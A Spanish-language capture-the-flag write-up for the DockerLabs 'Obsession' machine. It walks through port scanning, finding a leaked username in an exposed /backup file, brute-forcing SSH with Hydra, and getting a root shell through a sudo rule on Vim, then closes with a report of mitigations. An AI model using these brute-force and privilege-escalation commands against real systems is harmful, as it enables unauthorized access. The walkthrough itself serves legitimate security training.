# Obsession

> Directorio /backup expuesto con un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo sobre Vim.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `FTP` · `Dirb` · `Fuga de credenciales` · `Hydra` · `sudo Vim` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -sCV -sS -n -Pn -p- 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5   <-- login anónimo habilitado
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    Apache httpd 2.4.58
```

Tres servicios: FTP (con acceso anónimo), SSH y una web de coaching en el 80.

## Enumeración web

El código fuente de la web tiene un comentario sospechoso. Amplío la búsqueda de recursos ocultos con Dirb.

```bash
$ dirb http://172.17.0.2
==> DIRECTORY: http://172.17.0.2/backup/
+ http://172.17.0.2/backup/backup.txt (CODE:200)
```

Dentro de `/backup/` hay un `backup.txt` con información sensible.

```bash
$ curl http://172.17.0.2/backup/backup.txt
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

Tengo un usuario válido: **russoski**.

## Explotación · fuerza bruta

```bash
$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50 -I
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

Con **russoski : iloveme** entro por SSH.

```bash
$ ssh russoski@172.17.0.2
russoski@a1919dfe5717:~$
```

## Escalada a root · sudo Vim

```bash
$ sudo -l
User russoski may run the following commands on a1919dfe5717:
    (root) NOPASSWD: /usr/bin/vim
```

Vim ejecutable como root permite lanzar un shell desde su modo comando (`:!`), un abuso clásico de GTFOBins.

```bash
$ sudo /usr/bin/vim -c ':!/bin/bash'
# whoami
root
```

Máquina Obsession completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo sobre Vim

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** Vim ejecutable como root permite lanzar una shell desde su modo comando (:!), escalando a root (GTFOBins).

**Mitigación.** Retirar Vim de sudoers; si se necesita edición privilegiada, usar herramientas acotadas como sudoedit.

### 🟠 ALTA — Backup con información sensible expuesto en la web

`CWE-538` · A01:2021 – Broken Access Control

**Impacto.** El directorio /backup es accesible y su backup.txt filtra un usuario válido (russoski).

**Mitigación.** No alojar copias de seguridad dentro del webroot y aplicar control de acceso a los recursos internos.

### 🟠 ALTA — Contraseña débil susceptible a fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta russoski usa una contraseña de diccionario (iloveme), accesible por SSH mediante fuerza bruta.

**Mitigación.** Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave.

### 🟡 MEDIA — Acceso anónimo al servicio FTP

`CWE-306` · A05:2021 – Security Misconfiguration

**Impacto.** El FTP permite login anónimo, ampliando la superficie de ataque y la posible exposición de ficheros.

**Mitigación.** Deshabilitar el acceso anónimo y exigir autenticación.

---

_Writeup de **Obsession** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
